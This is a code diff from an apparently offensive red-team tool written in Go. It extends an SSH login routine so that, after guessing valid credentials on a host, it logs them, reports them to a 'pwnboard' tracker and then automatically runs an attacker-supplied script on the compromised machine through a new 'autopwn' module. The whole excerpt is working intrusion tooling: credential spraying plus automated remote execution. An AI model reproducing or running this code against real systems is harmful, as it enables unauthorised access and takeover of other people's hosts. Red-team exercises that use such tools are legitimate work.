@@ -6,6 +6,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/opt/red-script/internal/autopwn"
 	"github.com/opt/red-script/internal/files"
 	"github.com/opt/red-script/internal/pwnboard"
 	"golang.org/x/crypto/ssh"
@@ -17,7 +18,7 @@ const DEFAULT_PORT int = 22
 // Function that uses the provided user and password to attempt to log into
 //	the provided host. If login is successful, the function will also attempt
 //	to alert pwnboard.
-func Connect(host, user, password string, wg *sync.WaitGroup) {
+func Connect(host, user, password string, scriptPath string, wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	sshConfig := &ssh.ClientConfig{
@@ -44,4 +45,8 @@ func Connect(host, user, password string, wg *sync.WaitGroup) {
 	files.WriterChan <- fmt.Sprintf("ssh:'%s':'%s':'%s'\n", host, user, password)
 
 	pwnboard.SendUpdate(host, fmt.Sprintf("ssh:'%s':'%s':Default creds", user, password))
+
+	if scriptPath != "" {
+		autopwn.SSHAutopwn(host, user, password, scriptPath)
+	}
 }
